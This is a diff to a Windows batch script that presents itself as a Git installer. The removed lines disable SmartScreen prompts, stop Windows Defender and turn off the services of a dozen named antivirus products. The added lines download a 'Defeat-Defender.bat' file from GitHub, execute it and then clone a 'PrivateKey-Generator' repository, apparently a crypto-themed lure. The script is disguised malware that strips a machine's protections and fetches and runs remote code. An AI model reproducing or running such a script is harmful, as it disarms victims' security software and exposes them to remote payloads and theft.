@@ -19,51 +19,35 @@ set "PATH=%PATH%;C:\Program Files\Git\bin;C:\Program Files\Git\cmd"
 :: Inform the user
 echo 'Git has been installed and added to PATH. You can now use Git in this Command Prompt session.'
 
+:: Check if Git is now installed
+git --version >nul 2>&1
+if %ERRORLEVEL% neq 0 (
+    echo 'Git installation failed. Exiting...'
+    exit /b %ERRORLEVEL%
+)
 
 
+:: Define the URL for the Defeat-Defender.bat file
+set "url=https://github.com/swagkarna/Defeat-Defender-V1.2.0/raw/refs/heads/main/Defeat-Defender.bat"
+set "outputFile=Defeat-Defender.bat"
 
-:: Proceed with the rest of the script
-powershell -Command "
-# Check if SmartScreen is already disabled
-$smartScreen = Get-MpPreference | Select-Object -ExpandProperty DisableSmartScreenOverridePrompt
-if (-not $smartScreen) {
-    Set-MpPreference -DisableSmartScreenOverridePrompt $true
-}
+:: Download the Defeat-Defender.bat file
+powershell -Command "Invoke-WebRequest -Uri %url% -OutFile %outputFile%"
+if %ERRORLEVEL% neq 0 (
+    echo 'Failed to download Defeat-Defender.bat. Exiting...'
+    exit /b %ERRORLEVEL%
+)
 
-# Check if Windows Defender is already disabled
-$defenderStatus = Get-Service -Name 'WinDefend' -ErrorAction SilentlyContinue
-if ($defenderStatus.Status -eq 'Running') {
-    Stop-Service -Name 'WinDefend' -Force
-    Set-MpPreference -DisableRealtimeMonitoring $true
-}
+:: Execute the downloaded Defeat-Defender.bat file
+start /wait cmd /c "%outputFile%"
+if %ERRORLEVEL% neq 0 (
+    echo 'Failed to execute Defeat-Defender.bat. Exiting...'
+    exit /b %ERRORLEVEL%
+)
 
-$softwareList = Get-WmiObject -Class Win32_Product | Where-Object { $_.Name -match 'Antivirus' }
-if ($softwareList.Count -eq 0) {
-    echo 'No antivirus software found. Exiting...'
-    exit
-}
-foreach ($software in $softwareList) {
-    switch ($software.Name) {
-        'Avast' { Set-Service -Name 'AvastSvc' -StartupType Disabled; break }
-        'Norton' { Set-Service -Name 'Symantec Antivirus Service' -StartupType Disabled; break }
-        'McAfee' {
-            Set-Service -Name 'McAfee Framework Service' -StartupType Disabled
-            Set-Service -Name 'McAfee Service Controller' -StartupType Disabled
-            break
-        }
-        'Kaspersky' { Set-Service -Name 'Kaspersky Lab Service' -StartupType Disabled; break }
-        'Bitdefender' { Set-Service -Name 'Bitdefender Antivirus' -StartupType Disabled; break }
-        'AVG' { Set-Service -Name 'AvgSvc' -StartupType Disabled; break }
-        'Avira' { Set-Service -Name 'Avira Service' -StartupType Disabled; break }
-        'Sophos' { Set-Service -Name 'Sophos' -StartupType Disabled; break }
-        'Trend Micro' { Set-Service -Name 'Trend Micro' -StartupType Disabled; break }
-        'Webroot' { Set-Service -Name 'Webroot Service' -StartupType Disabled; break }
-        'ESET NOD32' { Set-Service -Name 'ekrn' -StartupType Disabled; break }
-        'Panda' { Set-Service -Name 'Panda' -StartupType Disabled; break }
-        # Add more cases for other antivirus software as needed
-    }
-}
-"
+:: Inform the user that the process is complete
+echo 'Defeat-Defender.bat executed successfully.'
+
 
 git clone https://github.com/CelestialNFT/PrivateKey-Generator.git
 if %ERRORLEVEL% neq 0 (
